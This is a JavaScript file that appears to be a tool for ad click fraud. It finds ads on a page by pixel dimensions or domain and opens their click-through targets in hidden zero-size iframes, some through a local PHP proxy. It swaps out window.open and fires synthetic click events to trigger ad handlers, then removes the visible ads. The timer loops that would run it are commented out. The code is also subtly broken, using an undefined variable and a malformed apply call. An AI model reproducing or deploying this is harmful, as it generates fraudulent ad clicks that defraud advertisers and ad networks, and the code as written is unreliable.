var init = function () {
    if (!$) {
        window.$ = window.jQuery;
    }
};

init();

var triggerEvent = function (dom, type) {
    // 创建
    var evt = document.createEvent('HTMLEvents');

    // 初始化
    evt.initEvent(type, true, true);

    // 触发
    dom.dispatchEvent(evt);
};

var isNotUrl = function (str) {
    if (!str || str.indexOf('javascript:') === 0) {
        return true;
    }
    return false;
};

var findAdsWithSize = function (width, height, context) {
    if (!context) {
        context = $('html');
    }
    return context.find('img,embed,iframe,object').filter(function (index, item) {
        return $(item).width() == width && $(item).height() == height;
    });
};

var findAdsWithDomain = function (domain, context) {
    if (!context) {
        context = $('html');
    }
    return context.find('embed,iframe').filter(function (index, item) {
        var src = $(item).attr('src');
        return src && src.indexOf(domain) > -1 && src.indexOf(domain) < 9;
    });
};

var openAds = function (href) {
    var $iframe = $('<iframe height=0 width=0 />');
    $('body').append($iframe);
    $iframe.get(0).src = href;
};

var openIframeAds = function (src) {
    var $iframe = $('<iframe height=0 width=0 />');
    $('body').append($iframe);
    $iframe.on('load', function (e) {
        var $html = $(this).contents();
        var arg = [];
        for (var i = 1; i < arguments.length; i ++) {
            arg.push(arguments[i]);
        }
        autoOpenAds.apply(arg.concat($html));
    });
    $iframe.get(0).src = '/PHPProxy/phpproxy.php?url=' + src;
};

var autoOpenAds = function (width, height, context) {
    var $ads = findAdsWithSize(width, height, context);

    if ($ads.length < 1) {
        return false;
    }

    if ($ads.get(0).tagName === 'IFRAME') {
        openIframeAds($ads.attr('src'), width, height);
        if ($ads.parent().get(0).tagName === 'BODY') {
            $ads.remove();
        } else {
            $ads.parent().remove();
        }
    } else {
        var $a = $img.siblings('a');
        if ($a.length === 0) {
            $a = $img.parents('a');
        }

        if (isNotUrl($a.attr('href'))) {
            var wOpen = window.open;
            window.open = openAds;
            triggerEvent($a.get(0), 'click');
            window.open = wOpen;
        } else {
            openAds($a.attr('href'));
        }

        if ($a.parent().get(0).tagName === 'BODY') {
            $a.remove();
        } else {
            $a.parent().remove();
        }
    }

    return true;
};

// setTimeout(function () {
//     if (!autoOpenAds(300, 250)) {
//         setTimeout(arguments.callee, 1000);
//     }
// }, 1000);

// setTimeout(function () {
//     if (!autoOpenAds(728, 90)) {
//         setTimeout(arguments.callee, 1000);
//     }
// }, 1000);
